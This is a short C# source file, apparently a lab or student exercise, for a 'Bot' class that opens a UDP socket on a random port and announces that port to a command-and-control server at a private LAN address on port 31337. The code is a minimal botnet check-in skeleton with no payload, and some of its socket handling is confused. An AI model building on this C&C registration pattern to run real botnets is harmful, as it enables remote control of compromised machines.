using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System.Net.Sockets;
using System.Net;

namespace Bot_Computer
{
    class Bot
    {
        public int Port { get; set; }
        private UdpClient udpListener;
        private const int cncPort = 31337; // the port of C&C server

        public Bot()
        {
            Random random = new Random();
            //Port = (short) random.Next(1025, 65535);
            Port = random.Next(1025, 65535);

            StartServer();
        }

        // init the server on the localhost ip and the random port
        public void StartServer()
        {
            try
            {
                // establish UDP connection and listen on local ip address and the random port
                using (udpListener = new UdpClient())
                {
                    IPEndPoint dest = new IPEndPoint(new IPAddress(3232235796), Port);
                    udpListener.Connect(dest);
                }
                Console.WriteLine("Bot is listening on port " + Port);
            }
            catch (SocketException)
            {
                Console.WriteLine("Unable connect port" + Port);
            }
        }

        public void SendAnnouncement()
        {
            // send to the C&C server at the local ip and fixed ccPort
            UdpClient conn = new UdpClient(new IPEndPoint(IPAddress.Parse("192.168.1.20"), cncPort));
            byte[] sendData = Encoding.UTF8.GetBytes(Convert.ToString(Port));
            conn.Send(sendData, sendData.Length);
            conn.Close();
        }
    }
}
// LOCAL IP 192.168.1.20 == 3232235796 in long